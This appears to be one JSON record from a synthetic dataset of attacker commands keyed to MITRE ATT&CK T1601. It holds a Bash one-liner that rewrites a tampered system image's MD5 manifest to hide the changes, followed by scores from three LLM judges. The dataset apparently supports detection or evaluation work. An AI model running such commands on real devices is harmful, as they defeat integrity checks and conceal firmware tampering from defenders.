@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "ld=$(losetup -fP --show /var/tmp/modified_system.img) && mount ${ld}p1 /mnt/img && cp /mnt/img/etc/manifest.md5 /tmp/manifest.md5.bak && (cd /mnt/img && find . -type f -printf '%P\\n' | LC_ALL=C sort | xargs -r md5sum) > /mnt/img/etc/manifest.md5 && diff -u /tmp/manifest.md5.bak /mnt/img/etc/manifest.md5 && umount /mnt/img && losetup -d \"$ld\"",
+  "explanation": "Regenerates the image's MD5 manifest to align checksums with tampered files, then diffs the old vs new manifest to validate the stealthy update.",
+  "rationale_steps": [
+    "Mount the modified image and back up the checksum manifest.",
+    "Recompute MD5s over the image contents to update the manifest.",
+    "Diff manifests to confirm integrity metadata was altered to mask changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1601-6048333d-fae79228",
+  "source_prompt_hash": "6048333d",
+  "timestamp_utc": "2025-09-30T04:32:34.003779Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash with balanced quoting/parentheses, proper chaining and redirection, and generally valid flags.",
+        "semantic_score": 3,
+        "semantic_justification": "It aligns with T1601 by modifying a mounted image’s manifest, but it incorrectly claims no privilege, includes the output manifest in its own checksum set, and assumes tools/flags that may not exist on network devices.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T19:29:43.508619Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced parentheses, proper use of &&, valid losetup/mount/find/xargs/md5sum/diff flags, correct variable referencing, and proper quoting throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements the claimed intent: it mounts a modified system image via loop device, backs up the original MD5 manifest, regenerates the manifest to reflect tampered file checksums (covering tracks), diffs old vs new to validate the update, then cleanly unmounts — directly aligning with T1601 firmware image tampering and integrity subversion.",
+        "combined_score": 5.0,
+        "confidence": 0.92,
+        "timestamp": "2026-02-19T01:24:11.496335Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is a perfectly valid sequence of Bash operations using standard tools and correct variable interpolation.",
+        "semantic_score": 4,
+        "semantic_justification": "The command accurately implements image manifest tampering, though it requires root privileges which contradicts the 'None' privilege label, and assumes standard Linux utilities are available on the target network device.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-19T01:24:15.717121Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
